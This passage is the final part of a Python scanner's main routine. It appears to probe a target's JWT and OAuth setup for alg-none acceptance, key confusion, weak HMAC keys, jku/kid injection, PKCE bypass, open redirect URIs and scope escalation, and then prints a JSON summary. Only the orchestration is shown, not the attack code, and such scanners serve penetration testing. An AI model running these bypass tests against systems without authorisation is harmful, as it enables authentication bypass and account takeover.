            jwks_uri = oidc.get("jwks_uri")
            if jwks_uri:
                jwks = fetch_jwks(jwks_uri)
                summary["jwks_fetched"] = bool(jwks)
                summary["jwks_key_count"] = (len(jwks.get("keys", []))
                                             if jwks else 0)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"oidc_discovery:{type(e).__name__}:{e}")

    # ─── 2. Decode sample JWT (if supplied) ────────────────────────────────
    sample_header: Optional[Dict] = None
    sample_payload: Optional[Dict] = None
    if SUPPLIED_JWT:
        try:
            sample_header, sample_payload = jwt_decode_unverified(SUPPLIED_JWT)
            summary["sample_jwt_alg"] = (sample_header or {}).get("alg")
            summary["sample_jwt_kid"] = (sample_header or {}).get("kid")
        except Exception as e:  # noqa: BLE001
            summary["errors"].append(f"jwt_decode:{type(e).__name__}:{e}")

    # ─── 3. JWT vulnerability tests ────────────────────────────────────────
    try:
        summary["alg_none_vulnerable"] = test_alg_none(
            TARGET_URL, oidc, SUPPLIED_JWT, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"alg_none:{type(e).__name__}:{e}")

    try:
        summary["key_confusion_vulnerable"] = test_key_confusion(
            jwks, SUPPLIED_JWT, TARGET_URL, oidc, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"key_confusion:{type(e).__name__}:{e}")

    try:
        summary["weak_key_found"] = test_weak_hmac_key(SUPPLIED_JWT, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"weak_key:{type(e).__name__}:{e}")

    try:
        summary["jku_injectable"] = test_jku_x5u_injection(
            TARGET_URL, oidc, SUPPLIED_JWT, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"jku_injection:{type(e).__name__}:{e}")

    # kid_injection is a diagnostic test — stored in results[], not top-level.
    try:
        test_kid_injection(TARGET_URL, oidc, SUPPLIED_JWT, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"kid_injection:{type(e).__name__}:{e}")

    # claim_manipulation is a diagnostic test — stored in results[], not top-level.
    try:
        test_claim_manipulation(TARGET_URL, oidc, SUPPLIED_JWT, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"claim_manipulation:{type(e).__name__}:{e}")

    # ─── 4. OAuth 2.0 vulnerability tests ──────────────────────────────────
    try:
        summary["pkce_bypass"] = test_pkce_bypass(oidc, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"pkce_bypass:{type(e).__name__}:{e}")

    try:
        summary["redirect_uri_open"] = test_redirect_uri_open(oidc, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"redirect_uri:{type(e).__name__}:{e}")

    # Token leakage is diagnostic — stored in results[].
    try:
        test_token_leakage(oidc, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"token_leakage:{type(e).__name__}:{e}")

    try:
        summary["scope_escalation"] = test_scope_escalation(
            oidc, SUPPLIED_JWT, TARGET_URL, results)
    except Exception as e:  # noqa: BLE001
        summary["errors"].append(f"scope_escalation:{type(e).__name__}:{e}")

    summary["elapsed_ms"] = round((time.time() - t0) * 1000, 1)
    print(json.dumps(summary, indent=2, default=str))


if __name__ == "__main__":
    main()
